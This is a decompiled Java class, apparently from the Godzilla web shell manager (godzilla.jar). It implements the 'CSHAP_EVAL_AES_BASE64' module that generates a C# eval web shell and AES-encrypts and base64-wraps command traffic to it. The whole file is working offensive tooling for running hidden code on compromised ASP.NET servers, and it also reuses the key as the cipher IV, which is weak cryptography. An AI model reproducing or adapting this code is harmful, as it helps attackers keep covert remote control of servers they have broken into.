/*     */ package shells.cryptions.cshapAes;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import javax.crypto.Cipher;
/*     */ import javax.crypto.spec.IvParameterSpec;
/*     */ import javax.crypto.spec.SecretKeySpec;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ @CryptionAnnotation(Name = "CSHAP_EVAL_AES_BASE64", payloadName = "CShapDynamicPayload")
/*     */ public class CSharpEvalAesBase64
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Cipher decodeCipher;
/*     */   private Cipher encodeCipher;
/*     */   private String key;
/*     */   private boolean state;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String pass;
/*     */   private String findStrRight;
/*     */   private String evalContent;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  31 */     this.shell = context;
/*  32 */     this.http = this.shell.getHttp();
/*  33 */     this.key = this.shell.getSecretKeyX();
/*  34 */     this.pass = this.shell.getPassword();
/*  35 */     String findStrMd5 = functions.md5(this.shell.getSecretKey() + this.key);
/*  36 */     this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
/*  37 */     this.findStrRight = findStrMd5.substring(16).toUpperCase();
/*  38 */     this.evalContent = generateEvalContent();
/*     */     try {
/*  40 */       this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/*  41 */       this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/*  42 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/*  43 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/*  44 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  45 */       if (this.payload != null) {
/*  46 */         this.http.sendHttpResponse(this.payload);
/*  47 */         this.state = true;
/*     */       } else {
/*  49 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  52 */     } catch (Exception e) {
/*  53 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  62 */       return (String.format("%s=%s&", new Object[] { this.pass, this.evalContent }) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
/*  63 */     } catch (Exception e) {
/*  64 */       Log.error(e);
/*  65 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*     */     try {
/*  73 */       data = functions.base64Decode(findStr(data));
/*  74 */       return this.decodeCipher.doFinal(data);
/*  75 */     } catch (Exception e) {
/*  76 */       Log.error(e);
/*  77 */       return null;
/*     */     } 
/*     */   }
/*     */   
/*     */   public String findStr(byte[] respResult) {
/*  82 */     String htmlString = new String(respResult);
/*  83 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */   
/*     */   public String generateEvalContent() {
/*  88 */     String eval = (new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getResourceAsStream("template/eval.bin")))).replace("{secretKey}", this.key).replace("{pass}", this.shell.getSecretKey());
/*  89 */     eval = functions.base64EncodeToString(eval.getBytes());
/*  90 */     eval = String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", new Object[] { URLEncoder.encode(eval) });
/*  91 */     eval = URLEncoder.encode(eval);
/*  92 */     return eval;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  98 */     return true;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean check() {
/* 106 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 112 */     return (new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getResourceAsStream("template/evalShell.bin")))).replace("{pass}", password).getBytes();
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\cshapAes\CSharpEvalAesBase64.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */